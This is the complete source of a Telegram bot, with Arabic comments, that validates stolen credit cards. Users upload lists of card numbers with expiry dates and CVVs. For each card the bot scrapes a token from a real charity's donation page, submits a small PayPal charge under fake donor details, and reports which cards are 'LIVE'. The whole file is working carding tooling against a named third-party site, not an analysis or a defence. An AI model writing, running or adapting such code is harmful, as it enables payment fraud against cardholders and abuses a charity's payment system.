import telebot
import time
import threading
import cloudscraper
from telebot import types
import requests
import random
import os
import re
import base64
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
import urllib3

# --- إعدادات البوت ---
# جلب التوكن من متغيرات البيئة في ريندر
BOT_TOKEN = os.getenv("TG_BOT_VISA")

# التحقق من وجود التوكن
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN not found! Please set TG_BOT_VISA environment variable in Render.")

# إنشاء البوت
bot = telebot.TeleBot(BOT_TOKEN)

# --- قائمة لتخزين البطاقات النشطة ---
live_cards = []

# =================================================================
# --- دالة الفحص التي أرسلتها (بدون أي تعديل) ---
# =================================================================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pp(ccx, amount="1.10"):
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
    street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    company = f"{random.choice(['Global', 'National', 'Advanced', 'Premium'])} {random.choice(['Tech', 'Solutions', 'Services', 'Group'])}"
    street_number = random.randint(100, 9999)
    street_name = random.choice(street_names)
    street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
    street_address1 = f"{street_number} {street_name} {street_type}"
    street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}"
    city = random.choice(cities)
    state_abbr = random.choice(states)
    zip_code = f"{random.randint(10000, 99999)}"
    country = "United States"
    
    scraper = cloudscraper.create_scraper()
    user = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    r = requests.session()
    r.verify = False

    headers = {
        'authority': 'combatantcraftcrewman.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'user-agent': user,
    }

    response = r.get('https://combatantcraftcrewman.org/make-a-donation/', headers=headers)

    ssa = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
    pro0 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
    ifr = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)

    enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
    decoded_bytes = base64.b64decode(enc)
    dec = decoded_bytes.decode('utf-8')
    au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
    
    headers = {
        'authority': 'combatantcraftcrewman.org',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://combatantcraftcrewman.org',
        'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': pro0,
        'give-form-id': ifr,
        'give-form-title': 'Join Our Cause <br/><p style="color: #222222;font-size: 17px; font-weight: 400;font-family:Montserrat, sans-serif;">EIN #46-3934554</p>',
        'give-current-url': 'https://combatantcraftcrewman.org/make-a-donation/',
        'give-form-url': 'https://combatantcraftcrewman.org/make-a-donation/',
        'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': ssa,
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': '1.00',
        'give-recurring-period-donors-choice': 'month',
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': 'DRGAM',
        'give_last': 'rights and',
        'give_email': email,
        'give_comment': '',
        'card_name': 'drgam ',
        'card_exp_month': '',
        'card_exp_year': '',
        'give_agree_to_terms': '1',
        'give_action': 'purchase',
        'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }
    
    response = r.post('https://combatantcraftcrewman.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    multipart_data = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, pro0),
        'give-form-id': (None, ifr),
        'give-form-title': (None, 'Join Our Cause <br/><p style="color: #222222;font-size: 17px; font-weight: 400;font-family:Montserrat, sans-serif;">EIN #46-3934554</p>'),
        'give-current-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
        'give-form-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
        'give-form-minimum': (None, '1.00'),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, ssa),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, '1.00'),
        'give-recurring-period-donors-choice': (None, 'month'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'DRGAM'),
        'give_last': (None, 'rights and'),
        'give_email': (None, email),
        'give_comment': (None, ''),
        'card_name': (None, 'drgam '),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give_agree_to_terms': (None, '1'),
        'give-gateway': (None, 'paypal-commerce'),
    })

    headers = {
        'authority': 'combatantcraftcrewman.org',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': multipart_data.content_type,
        'origin': 'https://combatantcraftcrewman.org',
        'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
        'user-agent': user,
    }
    
    params = {
        'action': 'give_paypal_commerce_create_order',
    }
    response = r.post(
        'https://combatantcraftcrewman.org/wp-admin/admin-ajax.php',
        params=params,
        headers=headers,
        data=multipart_data,
    )

    id = response.json()['data']['id']
    headers = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {au}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'paypal-client-metadata-id': '2e65cd82c5f19469dfc0dd0cbd4cffa3',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
    }
    
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'20{yy}-{mm}',
                'security_code': cvc,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }
    
    response = r.post(
        f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
        headers=headers,
        json=json_data,
    )
    multipart_data2 = MultipartEncoder({
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, pro0),
        'give-form-id': (None, ifr),
        'give-form-title': (None, 'Join Our Cause <br/><p style="color: #222222;font-size: 17px; font-weight: 400;font-family:Montserrat, sans-serif;">EIN #46-3934554</p>'),
        'give-current-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
        'give-form-url': (None, 'https://combatantcraftcrewman.org/make-a-donation/'),
        'give-form-minimum': (None, '1.00'),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, ssa),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, '1.00'),
        'give-recurring-period-donors-choice': (None, 'month'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'DRGAM'),
        'give_last': (None, 'rights and'),
        'give_email': (None, email),
        'give_comment': (None, ''),
        'card_name': (None, 'drgam '),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'give-agree-to-terms': (None, '1'),
        'give-gateway': (None, 'paypal-commerce'),
    })

    headers = {
        'authority': 'combatantcraftcrewman.org',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': multipart_data2.content_type,
        'origin': 'https://combatantcraftcrewman.org',
        'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
        'user-agent': user,
    }
    
    params = {
        'action': 'give_paypal_commerce_approve_order',
        'order': id,
    }
    
    response = r.post(
        'https://combatantcraftcrewman.org/wp-admin/admin-ajax.php',
        params=params,
        headers=headers,
        data=multipart_data2,
    )
    
    text = response.text
    time.sleep(10)

    if 'true' in text:    
        return "Thank You For Your Donation"
    elif 'DO_NOT_HONOR' in text:
        return "DO_NOT_HONOR"
    elif 'ACCOUNT_CLOSED' in text:
        return "ACCOUNT_CLOSED"
    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
    elif 'LOST_OR_STOLEN' in text:
        return "LOST_OR_STOLEN"
    elif 'CVV2_FAILURE' in text:
        return "CVV2_FAILURE"
    elif 'SUSPECTED_FRAUD' in text:
        return "SUSPECTED_FRAUD"
    elif 'INVALID_ACCOUNT' in text:
        return "INVALID_ACCOUNT"
    elif 'REATTEMPT_NOT_PERMITTED' in text:
        return "REATTEMPT_NOT_PERMITTED"
    elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
        return "ACCOUNT_BLOCKED_BY_ISSUER"
    elif 'ORDER_NOT_APPROVED' in text:
        return "ORDER_NOT_APPROVED"
    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
        return "PICKUP_CARD_SPECIAL_CONDITIONS"
    elif 'PAYER_CANNOT_PAY' in text:
        return "PAYER_CANNOT_PAY"
    elif 'INSUFFICIENT_FUNDS' in text:
        return "INSUFFICIENT_FUNDS"
    elif 'GENERIC_DECLINE' in text:
        return "GENERIC_DECLINE"
    elif 'COMPLIANCE_VIOLATION' in text:
        return "COMPLIANCE_VIOLATION"
    elif 'TRANSACTION_NOT_PERMITTED' in text:
        return "TRANSACTION_NOT_PERMITTED"
    elif 'PAYMENT_DENIED' in text:
        return "PAYMENT_DENIED"
    elif 'INVALID_TRANSACTION' in text:
        return "INVALID_TRANSACTION"
    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
    elif 'SECURITY_VIOLATION' in text:
        return "SECURITY_VIOLATION"
    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
    elif 'INVALID_OR_RESTRICTED_CARD' in text:
        return "INVALID_OR_RESTRICTED_CARD"
    elif 'EXPIRED_CARD' in text:
        return "EXPIRED_CARD"
    elif 'CRYPTOGRAPHIC_FAILURE' in text:
        return "CRYPTOGRAPHIC_FAILURE"
    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
        return "TRANSACTION_CANNOT_BE_COMPLETED"
    elif 'DECLINED_PLEASE_RETRY' in text:
        return "DECLINED_PLEASE_RETRY_LATER"
    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
        return "TX_ATTEMPTS_EXCEED_LIMIT"
    else:
        try:
            return response.json()['data']['error']
        except:
            return "UNKNOWN_ERROR"

# دالة مساعدة لتنسيق البطاقة
def format_card(cc_str):
    try:
        match = re.match(r'(\d{16})\s?\|\s?(\d{2})\s?\|\s?(\d{2,4})\s?\|\s?(\d{3,4})', cc_str)
        if not match:
            return None
        n, mm, yy, cvc = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{n}|{mm}|{yy}|{cvc}"
    except:
        return None

# =================================================================
# --- دالة الفحص التي ستعمل في Thread منفصل ---
# =================================================================
def process_cards_in_thread(chat_id, message_id, file_path):
    global live_cards
    live_count = 0
    dead_count = 0
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            cards = [format_card(line.strip()) for line in f.readlines()]
        
        cards = [c for c in cards if c]
        total_cards = len(cards)
        if total_cards == 0:
            bot.edit_message_text("❌ لم يتم العثور على بطاقات صالحة في الملف.", chat_id, message_id)
            os.remove(file_path)
            return

        bot.edit_message_text(f"⚡️ بدأ فحص {total_cards} بطاقة...", chat_id, message_id)

        for card in cards:
            try:
                result = pp(card)
                
                if "Thank You For Your Donation" in str(result):
                    live_count += 1
                    live_cards.append(card)
                    # إرسال البطاقة الحية مباشرة للشات
                    bot.send_message(
                        chat_id,
                        f"🔥 **بطاقة حية (LIVE)** 🔥\n\n`{card}`\n\n**الرد:** `{result}`",
                        parse_mode='Markdown'
                    )
                else:
                    dead_count += 1
                
                # تحديث الرسالة بشكل دوري (اختياري، يمكن إزالته لزيادة السرعة)
                # bot.edit_message_text(f"⚡️ تم فحص {live_count + dead_count} / {total_cards} بطاقة...", chat_id, message_id)

            except Exception as e:
                print(f"Error checking card {card}: {e}")
                dead_count += 1

        # تحديث الرسالة النهائية
        final_text = f"✅ **اكتمل الفحص!**\n\n"
        final_text += f"🔥 **البطاقات الحية (LIVE):** `{live_count}`\n"
        final_text += f"💀 **البطاقات الميتة (DEAD):** `{dead_count}`\n"
        final_text += f"📊 **الإجمالي:** `{total_cards}`"
        
        bot.edit_message_text(final_text, chat_id, message_id, parse_mode='Markdown')

    except Exception as e:
        bot.edit_message_text(f"حدث خطأ غير متوقع: {e}", chat_id, message_id)
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# =================================================================
# --- الأمر الرئيسي لبدء الفحص ---
# =================================================================
@bot.message_handler(commands=['chr', 'CHR'])
def handle_charge_command(message):
    global live_cards
    live_cards = [] # إفراغ القائمة في كل مرة جديدة

    # التحقق من أن الرد على ملف
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "⚠️ يرجى الرد على ملف .txt يحتوي على البطاقات.")
        return

    # إنشاء أزرار الاختيار
    choice_keyboard = types.InlineKeyboardMarkup()
    confirm_button = types.InlineKeyboardButton(text="✅ تأكيد بدء الفحص", callback_data="start_charge_check")
    cancel_button = types.InlineKeyboardButton(text="❌ إلغاء", callback_data="cancel_check")
    choice_keyboard.add(confirm_button, cancel_button)

    bot.reply_to(
        message,
        "هل تريد بدء فحص التشارج (PayPal Charge)؟\nهذه العملية حقيقية وستحاول شحن مبلغ صغير للتحقق من البطاقة.",
        reply_markup=choice_keyboard
    )

# =================================================================
# --- معالج الأزرار التفاعلية ---
# =================================================================
@bot.callback_query_handler(func=lambda call: call.data == "start_charge_check")
def start_checking(call):
    try:
        # تنزيل الملف
        file_info = bot.get_file(call.message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # حفظ الملف مؤقتاً
        file_path = f"cards_{call.message.chat.id}.txt"
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # تعديل رسالة التأكيد
        processing_msg = bot.edit_message_text("⚡️ جاري تحميل الملف وبدء الفحص السريع...", call.message.chat.id, call.message.message_id)
        
        # تشغيل الفحص في Thread منفصل لعدم إيقاف البوت
        thread = threading.Thread(target=process_cards_in_thread, args=(call.message.chat.id, processing_msg.message_id, file_path))
        thread.start()

    except Exception as e:
        bot.edit_message_text(f"حدث خطأ أثناء تحميل الملف: {e}", call.message.chat.id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "cancel_check")
def cancel_checking(call):
    bot.edit_message_text("❌ تم إلغاء عملية الفحص.", call.message.chat.id, call.message.message_id)

# =================================================================
# --- الأمر لعرض البطاقات الحية ---
# =================================================================
@bot.message_handler(commands=['live', 'LIVE'])
def show_live_cards(message):
    global live_cards
    if not live_cards:
        bot.reply_to(message, "📭 لا توجد بطاقات حية حالياً في الخانة.")
        return

    live_text = "🔥 **البطاقات الحية (LIVE):**\n\n"
    for card in live_cards:
        live_text += f"`{card}`\n"
    
    bot.reply_to(message, live_text, parse_mode='Markdown')

# =================================================================
# --- تشغيل البوت ---
# =================================================================
print("- Bot is running with telebot on Render...")
bot.polling(none_stop=True)